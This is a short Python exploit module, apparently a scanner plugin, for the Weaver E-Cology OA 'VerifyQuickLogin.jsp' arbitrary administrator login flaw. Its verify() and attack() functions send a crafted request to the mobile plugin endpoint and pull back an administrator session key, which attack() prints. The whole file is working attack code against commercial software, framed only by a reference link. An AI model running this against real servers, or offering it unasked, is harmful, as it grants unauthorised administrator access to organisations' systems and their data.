import requests
import re
import urllib, json

def verify(url):
    result = {
        'name': '泛微OA E-Cology VerifyQuickLogin.jsp 任意管理员登录漏洞(2022HVV)',
        'vulnerable': False,
        'attack': True,
        'about': 'http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20VerifyQuickLogin.jsp%20%E4%BB%BB%E6%84%8F%E7%AE%A1%E7%90%86%E5%91%98%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.html'
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    timeout = 3
    vurl = urllib.parse.urljoin(url, '/mobile/plugin/VerifyQuickLogin.jsp')
    payload_data = 'identifier=1&language=1&ipaddress=x.x.x.x'
    try:
        rep = requests.get(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        json_rep = json.loads(rep.text)
        if len(json_rep['sessionkey']) > 0 and json_rep['message'] == "1":
            result['vulnerable'] = True
            result['sessionkey'] = json_rep['sessionkey']
        return result
    except:
        return result

def attack(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    timeout = 3
    vurl = urllib.parse.urljoin(url, '/mobile/plugin/VerifyQuickLogin.jsp')
    payload_data = 'identifier=1&language=1&ipaddress=x.x.x.x'
    try:
        rep = requests.get(vurl, timeout=timeout, verify=False, headers=headers, data=payload_data)
        json_rep = json.loads(rep.text)
        print('[*] 获取到sessionkey', json_rep['sessionkey'])
        return True
    except:
        return False